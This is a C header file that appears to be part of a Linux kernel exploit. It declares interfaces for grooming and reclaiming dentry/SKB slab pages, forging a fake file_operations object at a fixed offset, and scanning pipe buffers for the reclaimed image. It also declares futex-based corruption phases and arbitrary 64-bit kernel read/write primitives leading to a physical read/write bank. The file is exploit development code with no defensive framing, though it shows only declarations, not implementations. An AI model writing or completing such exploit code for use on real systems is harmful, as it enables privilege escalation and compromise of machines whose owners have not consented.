#ifndef OSS_CLONE_DENTRY_FOPS_PREFLIGHT_H
#define OSS_CLONE_DENTRY_FOPS_PREFLIGHT_H

#include <stddef.h>
#include <stdint.h>

#define OSS_FOPS_CANDIDATE_COUNT 4u
#define OSS_FOPS_CANDIDATE_ATTEMPTS 8u
#define OSS_FOPS_RECLAIM_ORDER3_SIZE 0x8000u

/* A preflight candidate is an object inside a reclaimed dentry/SKB landing
 * page.  The caller owns grooming and supplies only already-live addresses. */
struct oss_fops_candidate {
  uint64_t page;
  uint64_t object;
  uint64_t pipe_buffer;
};

typedef uint64_t (*oss_groom_candidate_source)(void *ctx);

/* Closed route accepts four distinct order-3 reclaim bases in at most eight
 * attempts. The current open payload's fake FOPS object is at base+0x1180. */
size_t oss_collect_fops_candidates(
    oss_groom_candidate_source source, void *ctx,
    struct oss_fops_candidate out[OSS_FOPS_CANDIDATE_COUNT]);

/* The three fields must identify one coherent file_operations instance. */
struct oss_fops_triplet {
  uint64_t owner;
  uint64_t flush;
  uint64_t release;
};

/* The reversible transport is deliberately separate from candidate policy.
 * `apply_probe` performs one bounded, reversible dentry/SKB probe. `read64`
 * and `write64` must operate on the selected candidate object only. */
struct oss_fops_preflight_transport {
  void *ctx;
  int (*apply_probe)(void *ctx, const struct oss_fops_candidate *candidate);
  int (*read64)(void *ctx, uint64_t address, uint64_t *value);
  int (*write64)(void *ctx, uint64_t address, uint64_t value);
};

enum oss_fops_preflight_status {
  OSS_FOPS_PREFLIGHT_NO_MATCH = 0,
  OSS_FOPS_PREFLIGHT_EXACT = 1,
  OSS_FOPS_PREFLIGHT_TRANSPORT_ERROR = -1,
  OSS_FOPS_PREFLIGHT_RESTORE_ERROR = -2,
};

struct oss_fops_preflight_result {
  enum oss_fops_preflight_status status;
  size_t scanned;
  size_t selected;
  struct oss_fops_triplet observed;
};

/* Closed ZZHL route reads one 0xfff-byte snapshot from each retained pipe
 * and inspects the three 0x400-aligned dentry objects inside that page.
 * Live list objects are classified by self-links; a released candidate is
 * accepted only when the complete 0x118-byte reclaim image matches. */
#define OSS_DENTRY_FOPS_IMAGE_SIZE 0x118u
#define OSS_DENTRY_PIPE_SNAPSHOT_SIZE 0xfffu
#define OSS_DENTRY_OBJECT_FIRST 0x000u
#define OSS_DENTRY_OBJECT_STRIDE 0x400u
#define OSS_DENTRY_OBJECT_LIMIT 0xc00u
#define OSS_DENTRY_FOPS_OWNER_OFF 0x008u
#define OSS_DENTRY_FOPS_IMAGE_OFF 0x010u
#define OSS_DENTRY_LINK_OFF 0x080u
#define OSS_DENTRY_PIPE_MARKER "RMG-P0-PIPE"
#define OSS_DENTRY_PIPE_MARKER_SIZE 11u
#define OSS_DENTRY_PIPE_FILL 0x5au

struct oss_dentry_snapshot_match {
  size_t pipe_index;
  size_t object_offset;
  uint64_t object_address;
  size_t exact_matches;
  size_t changed_pipes;
  size_t changed_pipe_index;
  size_t link_mismatches;
  size_t image_mismatches;
};

struct oss_futex_phase {
  unsigned sequence;
  uint64_t parent;
  uint64_t right;
  uint64_t lock;
};

struct oss_futex_multiphase_transport {
  void *ctx;
  int (*deliver)(void *ctx, const struct oss_futex_phase *phase);
  int (*verify)(void *ctx, const struct oss_fops_candidate *candidate,
                int *changed_pipe);
  int (*advance_pipe)(void *ctx);
  int (*narrow_pipe)(void *ctx, size_t pipe_index);
  /* Exact selection: release keeper and prepare the fresh physrw bank. */
  int (*release_pipe)(void *ctx);
  /* Exhausted NO_MATCH: release keeper/oracle only; never prepare fresh. */
  int (*cleanup_pipe)(void *ctx);
  uint64_t (*direct_to_page)(void *ctx, uint64_t address);
};

struct oss_futex_multiphase_result {
  size_t scanned;
  size_t selected_candidate;
  int changed_pipe;
};

/* Closed phase order: apply/verify/restore for four candidates, advancing one
 * retained pipe byte after sparse misses. Every applied phase is restored
 * before selection or failure. */
int oss_run_futex_multiphase_preflight(
    const struct oss_fops_candidate candidates[OSS_FOPS_CANDIDATE_COUNT],
    uint64_t pipe_page, uint64_t initial_lock,
    const struct oss_futex_multiphase_transport *transport,
    struct oss_futex_multiphase_result *result);

/* `pipe_pages` is `pipe_count * OSS_DENTRY_PIPE_SNAPSHOT_SIZE` bytes.
 * target_start/target_end describe the direct-map interval represented by
 * object_offset zero. A pipe is changed when its complete snapshot differs
 * from the original marker/fill page. Exactly one changed pipe containing
 * exactly one coherent image is required. */
int oss_dentry_fops_scan_snapshots(
    const unsigned char *pipe_pages, size_t pipe_count,
    uint64_t target_start, uint64_t target_end, uint64_t target_page,
    const unsigned char expected[OSS_DENTRY_FOPS_IMAGE_SIZE],
    struct oss_dentry_snapshot_match *match);

/* Runs candidates in order. Every candidate that reaches apply_probe is
 * restored before this function returns. An exact match is selected only when
 * all three post-probe fields equal `expected`. */
int oss_dentry_fops_preflight(
    const struct oss_fops_candidate *candidates, size_t count,
    const struct oss_fops_triplet *expected,
    const struct oss_fops_preflight_transport *transport,
    struct oss_fops_preflight_result *result);

#endif
